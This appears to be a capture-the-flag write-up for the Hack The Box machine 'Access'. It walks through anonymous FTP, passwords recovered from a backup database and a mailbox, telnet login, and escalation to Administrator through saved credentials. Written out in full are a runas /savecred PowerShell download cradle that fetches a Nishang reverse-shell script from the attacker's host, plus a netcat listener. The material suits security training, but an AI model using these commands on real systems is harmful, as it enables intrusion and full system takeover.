# Access
Access is a Windows machine that is rated as easy. This machine show how much saved credentials can be dangerous.

## Recon

Start with nmap scan:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Access]
└─$ nmap -sC -sV 10.10.10.98                    
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 13:17 EDT
Nmap scan report for 10.10.10.98
Host is up (0.095s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.05 seconds
```

So I checked port 80 and there is nothing. So I decided to check ftp on port 21 and there some intresting data there.

## FTP

We can do ```Anonymous login``` on ftp:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Access]
└─$ ftp 10.10.10.98  
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
```
So there is a zip file in ```Engineer```, let's download it:
```
ftp> bin
200 Type set to I.
ftp> get "Access Control.zip"
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
10870 bytes received in 0.10 secs (106.8673 kB/s)
```
And also there is a file called ```backup.mdb``` in ```backup``` dir:
```
ftp> ls -lha
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> bin
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
5652480 bytes received in 1.83 secs (2.9445 MB/s)
```
So the zip file need a password, let's check the backup file and see if there is anything intresting there. I used this website to open the file https://www.mdbopener.com/

After you upload the file, open ```auth user``` and you will find a saved password there: ```access4u@security```.

# User Flag

Unzip the zip file using the password that we found, we get a file called ```Access Control.pst```:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Access]
└─$ file 'Access Control.pst' 
Access Control.pst: Microsoft Outlook email folder (>=2003)
```

So we can read the pst file using ```readpst``` command:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Access]
└─$ sudo readpst 'Access Control.pst' 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

So if we cat the ```.mbox``` file we get this:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Access]
└─$ cat 'Access Control.mbox' 
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-310657945_-_-"


----boundary-LibPST-iamunique-310657945_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-310657945_-_-"

--alt---boundary-LibPST-iamunique-310657945_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John
```
## telnet

So we have a username and a password: ```security:4Cc3ssC0ntr0ller```. Now we can use telnet to connect to the box:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Access]
└─$ telnet -l security 10.10.10.98                                                                                                                                                                                                     1 ⨯
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

We are in :)

Get the User flag:
```
C:\Users\security\Desktop>type user.txt
ff1f3b48913b213a31ff6756d2553d38
```

# Root Flag

In ```Public``` dir there is a suspicious file:
```
C:\Users\Public\Desktop>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public\Desktop

08/28/2018  07:51 AM    <DIR>          .
08/28/2018  07:51 AM    <DIR>          ..
07/14/2009  05:57 AM               174 desktop.ini
08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               2 File(s)          2,044 bytes
               2 Dir(s)  16,772,259,840 bytes free
```

So I can cat it, but I can't see it very well:

![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Access/images/1.png)

We can view it better using the command ```cmdkey```:
```
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

So first clone this from github: https://github.com/samratashok/nishang.git . Let's copy ```Invoke-PowerShellTcp.ps1``` and edit it:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Access]
└─$ cp nishang/Shells/Invoke-PowerShellTcp.ps1 .
```

And now add this line to the end of it: ```Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 443```

So you will be having somthing like this:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Access]
└─$ tail Invoke-PowerShellTcp.ps1                                                                                                                                                                                                      1 ⚙
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 443
```

And now start a python webserver:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Access]
└─$ python3 -m http.server                                                                                                                                                                                                             1 ⚙
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Make sure to run a listener:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nc -nlvp 443                                                                                                                                                                      
listening on [any] 443 ...
```

And in our telnet shell run this command: ```runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.27:8000/Invoke-PowerShellTcp.ps1')"```

You will get a reverse shell as ```administrator```:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nc -nlvp 443                                                                                                                                                                                                                  1 ⨯
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.98] 49158
Windows PowerShell running as user Administrator on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
access\administrator
```

Cat your root flag :)

```
PS C:\Users\Administrator\Desktop> type root.txt
6e1586cc7ab230a8d297e8f933d904cf
```

Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
